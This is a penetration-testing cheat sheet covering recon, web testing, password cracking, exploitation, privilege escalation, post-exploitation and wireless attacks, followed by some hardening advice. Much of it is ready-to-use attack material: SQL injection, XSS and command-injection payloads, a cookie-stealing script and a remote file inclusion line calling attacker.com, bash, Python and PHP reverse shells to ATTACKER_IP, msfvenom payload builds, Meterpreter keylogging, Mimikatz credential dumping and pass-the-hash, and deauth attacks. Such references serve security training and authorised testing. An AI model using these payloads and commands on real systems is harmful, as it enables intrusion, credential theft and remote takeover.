# Cybersecurity Quick Reference Notes

## Networking Fundamentals

### Subnetting Quick Reference
```
CIDR    Subnet Mask        Hosts    Networks
/8      255.0.0.0          16M      1
/16     255.255.0.0        65K      256
/24     255.255.255.0      254      65K
/25     255.255.255.128    126      128K
/26     255.255.255.192    62       256K
/27     255.255.255.224    30       512K
/28     255.255.255.240    14       1M
/29     255.255.255.248    6        2M
/30     255.255.255.252    2        4M
```

### Common Ports
```
20/21   FTP (File Transfer)
22      SSH (Secure Shell)
23      Telnet
25      SMTP (Email)
53      DNS
80      HTTP
110     POP3 (Email)
143     IMAP (Email)
443     HTTPS
445     SMB (Windows shares)
3306    MySQL
3389    RDP (Remote Desktop)
5432    PostgreSQL
8080    HTTP Alternate
```

### TCP Three-Way Handshake
```
Client -> Server: SYN
Server -> Client: SYN-ACK
Client -> Server: ACK
```

## Reconnaissance

### Passive Reconnaissance
```bash
# WHOIS lookup
whois example.com

# DNS enumeration
dig example.com
dig example.com ANY
dig example.com MX
dig example.com NS
nslookup example.com

# Subdomain enumeration
sublist3r -d example.com
amass enum -d example.com

# Shodan (Internet-connected devices)
# Use web interface or API

# Google dorking examples
site:example.com filetype:pdf
intitle:"index of" site:example.com
inurl:admin site:example.com
```

### Active Reconnaissance
```bash
# Ping sweep
nmap -sn 192.168.1.0/24
fping -g 192.168.1.0/24

# Basic port scan
nmap 192.168.1.10
nmap -p- 192.168.1.10              # All ports
nmap -p 80,443,8080 192.168.1.10   # Specific ports

# Service version detection
nmap -sV 192.168.1.10

# OS detection
nmap -O 192.168.1.10

# Aggressive scan
nmap -A 192.168.1.10

# Common NSE scripts
nmap --script vuln 192.168.1.10
nmap --script=http-enum 192.168.1.10
```

## Web Application Testing

### Directory Enumeration
```bash
# Gobuster
gobuster dir -u http://example.com -w /path/to/wordlist.txt
gobuster dir -u http://example.com -w wordlist.txt -x php,html,txt

# ffuf (fast)
ffuf -u http://example.com/FUZZ -w wordlist.txt
ffuf -u http://example.com/FUZZ -w wordlist.txt -e .php,.html,.txt

# Dirsearch
dirsearch -u http://example.com -w wordlist.txt
```

### SQL Injection
```sql
-- Basic detection
' OR 1=1--
' OR '1'='1
admin'--
' OR '1'='1' /*

-- Union-based
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- Time-based blind
' AND SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--

-- Error-based
' AND 1=CONVERT(int,(SELECT @@version))--

-- Boolean-based blind
' AND 1=1--  (true)
' AND 1=2--  (false)
```

### XSS (Cross-Site Scripting)
```html
<!-- Basic XSS -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

<!-- Cookie stealing -->
<script>document.location='http://attacker.com/?c='+document.cookie</script>

<!-- Bypassing filters -->
<ScRiPt>alert('XSS')</sCrIpT>
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
<iframe src="javascript:alert('XSS')">
```

### Command Injection
```bash
# Basic injection
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# With common commands
127.0.0.1; cat /etc/passwd
8.8.8.8 | whoami
example.com && id

# Time-based detection
; sleep 10
| ping -c 10 127.0.0.1
```

### File Inclusion
```bash
# Local File Inclusion (LFI)
page.php?file=../../../etc/passwd
page.php?file=....//....//....//etc/passwd

# PHP filters
page.php?file=php://filter/convert.base64-encode/resource=index.php

# Remote File Inclusion (RFI)
page.php?file=http://attacker.com/shell.txt
```

## Password Attacks

### Hashcat
```bash
# MD5
hashcat -m 0 -a 0 hash.txt wordlist.txt

# SHA1
hashcat -m 100 -a 0 hash.txt wordlist.txt

# SHA256
hashcat -m 1400 -a 0 hash.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 hash.txt wordlist.txt

# bcrypt
hashcat -m 3200 -a 0 hash.txt wordlist.txt

# Brute force (mask attack)
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l  # 6 lowercase letters
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d  # Upper+lower+2digits

# With rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule
```

### John the Ripper
```bash
# Crack with wordlist
john --wordlist=wordlist.txt hash.txt

# Crack with format
john --format=raw-md5 --wordlist=wordlist.txt hash.txt

# Show cracked passwords
john --show hash.txt

# Common formats
john --format=raw-sha1 hash.txt
john --format=nt hash.txt
john --format=raw-sha256 hash.txt
```

### Hydra (Online Attacks)
```bash
# SSH
hydra -l username -P passwords.txt ssh://192.168.1.10

# FTP
hydra -l admin -P passwords.txt ftp://192.168.1.10

# HTTP POST form
hydra -l admin -P passwords.txt 192.168.1.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"

# RDP
hydra -l administrator -P passwords.txt rdp://192.168.1.10
```

## Exploitation

### Metasploit Framework
```bash
# Start Metasploit
msfconsole

# Search for exploits
search <keyword>
search type:exploit platform:windows

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Show options
show options

# Set options
set RHOSTS 192.168.1.10
set LHOST 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Run exploit
exploit
run

# Meterpreter commands
sysinfo                # System information
getuid                 # Current user
ps                     # Process list
migrate <PID>          # Migrate to process
hashdump               # Dump password hashes
screenshot             # Take screenshot
keyscan_start          # Start keylogger
keyscan_dump           # Dump keystrokes
shell                  # Drop to shell
upload /path/file      # Upload file
download /path/file    # Download file
```

### Reverse Shells

#### Netcat Listener
```bash
# On attacker machine
nc -lvnp 4444
```

#### Bash Reverse Shell
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

#### Python Reverse Shell
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

#### PHP Reverse Shell
```php
<?php
$sock=fsockopen("ATTACKER_IP",4444);
exec("/bin/sh -i <&3 >&3 2>&3");
?>
```

#### Upgrading Shell
```bash
# Python PTY
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Then:
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

### Payload Generation (msfvenom)
```bash
# Windows executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe

# Linux executable
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# JSP web shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp

# WAR file
msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war

# Python payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py
```

## Privilege Escalation

### Linux Privilege Escalation
```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# Current user
id
whoami
groups

# SUDO privileges
sudo -l

# SUID binaries
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null
find / -perm -222 -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
crontab -l

# Capabilities
getcap -r / 2>/dev/null

# Running processes
ps aux
ps aux | grep root

# Network connections
netstat -tulpn
ss -tulpn

# Automated scripts
linpeas.sh
linux-exploit-suggester.sh
```

### Windows Privilege Escalation
```powershell
# System information
systeminfo
wmic qfe list

# Current user
whoami
whoami /priv
whoami /groups

# Users and groups
net user
net localgroup
net localgroup administrators

# Scheduled tasks
schtasks /query /fo LIST /v

# Services
sc query
wmic service list brief

# Unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Check permissions
icacls "C:\Program Files\Service\program.exe"

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Saved credentials
cmdkey /list

# Automated scripts
winPEAS.exe
PowerUp.ps1
```

## Post-Exploitation

### Mimikatz (Windows Credential Dumping)
```powershell
# Load Mimikatz
mimikatz.exe

# Privilege escalation
privilege::debug
token::elevate

# Dump credentials from memory
sekurlsa::logonpasswords

# Dump SAM database
lsadump::sam

# Export Kerberos tickets
sekurlsa::tickets /export

# Pass-the-hash
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:HASH /run:cmd.exe
```

### Windows File Transfer
```powershell
# PowerShell download
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER/file.exe','C:\temp\file.exe')"

# Certutil
certutil -urlcache -f http://ATTACKER/file.exe file.exe

# BITSAdmin
bitsadmin /transfer mydownload http://ATTACKER/file.exe C:\temp\file.exe
```

### Linux File Transfer
```bash
# Wget
wget http://ATTACKER/file.sh

# Curl
curl http://ATTACKER/file.sh -o file.sh

# Netcat (receiver)
nc -lvnp 4444 > file.txt

# Netcat (sender)
nc ATTACKER_IP 4444 < file.txt

# Base64 encode/decode
base64 file.txt    # On attacker
echo "BASE64_STRING" | base64 -d > file.txt  # On target
```

## Network Analysis

### Wireshark Filters
```
# IP address
ip.addr == 192.168.1.10
ip.src == 192.168.1.10
ip.dst == 192.168.1.10

# Protocol
http
dns
tcp
udp
icmp

# Port
tcp.port == 80
tcp.dstport == 443
udp.port == 53

# HTTP methods
http.request.method == "POST"
http.request.method == "GET"

# Follow stream
tcp.stream eq 0

# Contains string
http contains "password"
tcp contains "admin"

# Combinations
ip.addr == 192.168.1.10 && http
tcp.port == 80 && http.request.method == "POST"
```

### tcpdump
```bash
# Capture on interface
tcpdump -i eth0

# Capture specific host
tcpdump host 192.168.1.10

# Capture specific port
tcpdump port 80

# Write to file
tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Combinations
tcpdump -i eth0 'host 192.168.1.10 and port 80'
tcpdump -i eth0 'tcp port 80 or tcp port 443'
```

## Wireless Security

### Aircrack-ng Suite
```bash
# Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c CHANNEL --bssid MAC -w capture wlan0mon

# Deauth clients (to capture handshake)
aireplay-ng --deauth 10 -a ROUTER_MAC wlan0mon

# Crack WPA/WPA2
aircrack-ng -w wordlist.txt -b MAC capture.cap
```

## Burp Suite Essentials

### Proxy Setup
```
1. Set browser proxy: 127.0.0.1:8080
2. Import Burp CA certificate
3. Enable intercept
```

### Common Tasks
```
Intercept: Catch and modify requests
Repeater: Resend/modify individual requests
Intruder: Automated attacks (fuzzing, brute force)
Decoder: Encode/decode data
Comparer: Compare responses
Scanner: Automated vulnerability scanning (Pro only)
```

### Intruder Attack Types
```
Sniper: Single position, one payload set
Battering ram: Multiple positions, same payload
Pitchfork: Multiple positions, multiple payload sets (parallel)
Cluster bomb: Multiple positions, multiple payload sets (all combinations)
```

## Cryptography

### OpenSSL Commands
```bash
# Generate hash
echo -n "password" | openssl md5
echo -n "password" | openssl sha256

# Generate random bytes
openssl rand -base64 32
openssl rand -hex 16

# Encrypt file (AES-256)
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc

# Decrypt file
openssl enc -d -aes-256-cbc -in file.enc -out file.txt

# Generate RSA key pair
openssl genrsa -out private.key 2048
openssl rsa -in private.key -pubout -out public.key

# View certificate
openssl x509 -in cert.pem -text -noout

# Test SSL/TLS
openssl s_client -connect example.com:443
```

## Linux Security Tools

### System Hardening
```bash
# Update system
sudo apt update && sudo apt upgrade

# Firewall (ufw)
sudo ufw enable
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp

# Firewall (iptables)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -P INPUT DROP

# Disable root login (SSH)
# Edit /etc/ssh/sshd_config
PermitRootLogin no

# Check listening ports
netstat -tulpn
ss -tulpn

# Check user accounts
cat /etc/passwd
cat /etc/shadow

# Failed login attempts
grep "Failed password" /var/log/auth.log
```

### Log Analysis
```bash
# System logs
tail -f /var/log/syslog
tail -f /var/log/auth.log
tail -f /var/log/kern.log

# Apache logs
tail -f /var/log/apache2/access.log
tail -f /var/log/apache2/error.log

# Search for specific IP
grep "192.168.1.10" /var/log/apache2/access.log

# Find 404 errors
grep " 404 " /var/log/apache2/access.log

# Most common IPs
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head
```

## OWASP Top 10 (2021)

1. **Broken Access Control**
   - Vertical/horizontal privilege escalation
   - Insecure direct object references (IDOR)

2. **Cryptographic Failures**
   - Weak encryption
   - Storing sensitive data in plaintext
   - Weak key generation

3. **Injection**
   - SQL injection
   - Command injection
   - LDAP injection

4. **Insecure Design**
   - Missing security controls
   - Threat modeling failures

5. **Security Misconfiguration**
   - Default credentials
   - Unnecessary services enabled
   - Verbose error messages

6. **Vulnerable and Outdated Components**
   - Unpatched software
   - Deprecated libraries

7. **Identification and Authentication Failures**
   - Weak passwords
   - No MFA
   - Session fixation

8. **Software and Data Integrity Failures**
   - Insecure CI/CD pipeline
   - Unsigned code
   - Insecure deserialization

9. **Security Logging and Monitoring Failures**
   - Insufficient logging
   - No alerting
   - Logs not monitored

10. **Server-Side Request Forgery (SSRF)**
    - Unvalidated user input in URLs
    - Access to internal resources

## Security Best Practices

### Password Security
```
- Minimum 12+ characters
- Use passphrases
- Enable MFA everywhere
- Use password manager
- Unique password per service
- Never reuse passwords
```

### Secure Coding
```
- Input validation
- Output encoding
- Parameterized queries
- Least privilege principle
- Defense in depth
- Secure by default
- Regular security updates
```

### Network Security
```
- Change default passwords
- Disable unused services
- Keep systems patched
- Use VPN for remote access
- Segment networks
- Monitor traffic
- Implement IDS/IPS
```

## Quick Reference - CVE Examples

```
CVE-2021-44228  Log4Shell (Log4j RCE)
CVE-2017-0144   EternalBlue (SMBv1 RCE)
CVE-2014-6271   Shellshock (Bash RCE)
CVE-2017-5638   Apache Struts RCE
CVE-2020-1472   Zerologon (Netlogon privilege escalation)
CVE-2021-3156   Sudo heap overflow
CVE-2014-0160   Heartbleed (OpenSSL)
CVE-2019-0708   BlueKeep (RDP RCE)
```

## Useful One-Liners

```bash
# Find world-writable files
find / -type f -perm -o+w 2>/dev/null

# Extract IPs from text
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file.txt

# Extract emails
grep -oE "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b" file.txt

# Simple HTTP server (file sharing)
python3 -m http.server 8000

# Base64 encode
echo "text" | base64

# Base64 decode
echo "dGV4dA==" | base64 -d

# URL encode
echo "text" | jq -sRr @uri

# Generate random password
openssl rand -base64 12
```
